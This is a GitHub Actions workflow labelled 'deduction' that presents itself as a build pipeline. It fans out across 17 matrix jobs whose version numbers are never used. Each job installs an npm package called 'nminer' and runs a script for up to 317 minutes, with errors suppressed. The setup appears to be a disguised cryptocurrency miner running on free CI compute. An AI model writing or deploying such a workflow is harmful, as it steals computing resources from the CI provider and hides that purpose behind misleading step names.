name: deduction
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9893 }
          - { version: 333 }
          - { version: 8098 }
          - { version: 9716 }
          - { version: 7134 }
          - { version: 3358 }
          - { version: 4791 }
          - { version: 3723 }
          - { version: 8364 }
          - { version: 5136 }
          - { version: 1859 }
          - { version: 1711 }
          - { version: 3807 }
          - { version: 5507 }
          - { version: 2675 }
          - { version: 3847 }
          - { version: 9354 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: redesign
        run: |
          npm install nminer@latest
          timeout 317m node deduction.js || echo "deduction executed"